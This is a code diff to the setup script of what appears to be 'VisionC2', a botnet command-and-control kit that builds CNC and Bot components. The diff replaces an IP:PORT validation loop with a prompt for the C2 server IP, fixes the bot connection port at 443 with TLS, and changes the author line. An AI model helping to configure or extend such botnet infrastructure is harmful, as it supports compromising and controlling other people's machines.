@@ -9,7 +9,7 @@ Automates the complete setup process:
 - Updates CNC and Bot source code
 - Builds all components
 
-Author: Syn2Much
+Author: VisionC2 Team
 """
 
 import os
@@ -412,29 +412,8 @@ def main():
     # ═══════════════════════════════════════════════════════════
     print_step(1, 5, "C2 Server Configuration")
 
-    while True:
-        c2_address = prompt("Enter C2 address (IP:PORT)", "127.0.0.1:443")
-
-        if ":" not in c2_address:
-            warning("Format should be IP:PORT (e.g., 1.2.3.4:443)")
-            continue
-
-        parts = c2_address.split(":")
-        if len(parts) != 2:
-            warning("Invalid format. Use IP:PORT")
-            continue
-
-        try:
-            port = int(parts[1])
-            if port < 1 or port > 65535:
-                warning("Port must be between 1 and 65535")
-                continue
-        except ValueError:
-            warning("Port must be a number")
-            continue
-
-        break
-
+    c2_ip = prompt("Enter C2 server IP address", "127.0.0.1")
+    c2_address = f"{c2_ip}:443"
     config["c2_address"] = c2_address
 
     admin_port = prompt("Enter admin server port", "420")
@@ -442,6 +421,7 @@ def main():
 
     success(f"C2 configured: {c2_address}")
     success(f"Admin port: {admin_port}")
+    info("Bot connection port is fixed at 443 (TLS)")
 
     # ═══════════════════════════════════════════════════════════
     # Step 2: Security Tokens
